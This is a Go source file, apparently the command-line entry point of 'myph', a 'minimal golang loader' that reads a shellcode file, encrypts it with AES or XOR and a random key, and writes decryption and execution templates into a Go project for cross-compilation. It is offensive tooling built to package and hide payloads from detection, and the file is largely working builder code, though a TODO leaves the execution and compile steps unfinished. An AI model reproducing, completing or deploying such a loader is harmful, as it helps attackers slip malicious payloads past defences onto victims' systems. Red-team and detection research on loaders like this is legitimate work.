package cli

import (
	"fmt"
	"os"

    "github.com/cmepw/myph/tools"
	"github.com/spf13/cobra"
)


func GetParser(opts *Options) *cobra.Command {
	version := "2.0.0"
	var cmd = &cobra.Command{
		Use:                "myph",
		Version:            version,
		DisableSuggestions: true,
		Short:              "minimal golang loader",
		Long:               `In loving memory of Wassyl Iaroslavovytch Slipak (1974 - 2016)`,
		Run: func(cmd *cobra.Command, args []string) {

			if opts.ShellcodePath == "" {
				fmt.Println("[!] Please specify your shellcode's path with --shellcode")
				os.Exit(1)
			}

            err := tools.CreateTmpProjectRoot(opts.Outfile)
            if err != nil {
                fmt.Printf("[!] Error generating project root: %s", err)
                os.Exit(1)
            }

            shellcode, err := tools.ReadFile(opts.ShellcodePath)
            if err != nil {
                fmt.Printf("[!] Error reading shellcode file: %s", err)
                os.Exit(1)
            }

            if opts.Key == "" {
                opts.Key = tools.RandomString(64)
            }

            encType := tools.SelectRandomEncodingType()

            /*
                depending on encryption type, we do the following:

                - encrypt shellcode with key
                - write both encrypted & key to file
                - write to encrypt.go
                - write to go.mod the required dependencies
            */

            var encrypted = []byte{};
            var template = ""

            switch opts.Encryption {
                case EncKindAES:
                    encrypted, err = tools.EncryptAES(shellcode, []byte(opts.Key))
                    if err != nil {
                        fmt.Println("[!] Could not encrypt with AES")
                        os.Exit(1)
                    }
                    template = tools.GetAESTemplate()


                case EncKindXOR:
                    encrypted, err = tools.EncryptXOR(shellcode, []byte(opts.Key))
                    if err != nil {
                        fmt.Println("[!] Could not encrypt with XOR")
                        os.Exit(1)
                    }
                    template = tools.GetXORTemplate()
            }

            /* write decryption routine template */
            gofile_path := fmt.Sprintf("%s/encrypt.go", opts.Outfile)
            file, err := os.OpenFile(gofile_path, os.O_TRUNC | os.O_WRONLY, 0644)
            if err != nil {
                panic(err)
            }

            file.WriteString(template)
            file.Close()

            /* write main execution template */
            encodedShellcode := tools.EncodeForInterpolation(encType, encrypted)
            encodedKey := tools.EncodeForInterpolation(encType, []byte(opts.Key))
            maingo_path := fmt.Sprintf("%s/main.go", opts.Outfile)
            file, err = os.OpenFile(maingo_path, os.O_TRUNC | os.O_WRONLY, 0644)
            if err != nil {
                panic(err)
            }

            file.WriteString(tools.GetMainTemplate(encType.String(), encodedKey, encodedShellcode))
            file.Close()

            /* TODO: finish this by adding template for each exec method and run compile */

			os.Setenv("GOOS", opts.OS)
			os.Setenv("GOARCH", opts.arch)
        },


    }

	defaults := GetDefaultCLIOptions()

	cmd.PersistentFlags().StringVarP(&opts.Outfile, "outfile", "f", defaults.Outfile, "output filepath")
	cmd.PersistentFlags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")

	cmd.PersistentFlags().StringVarP(&opts.arch, "arch", "r", defaults.arch, "architecture compilation target")
	cmd.PersistentFlags().StringVarP(&opts.OS, "os", "o", defaults.OS, "OS compilation target")

    cmd.PersistentFlags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, RSA, XOR)")
    cmd.PersistentFlags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption-method)")

	return cmd
}
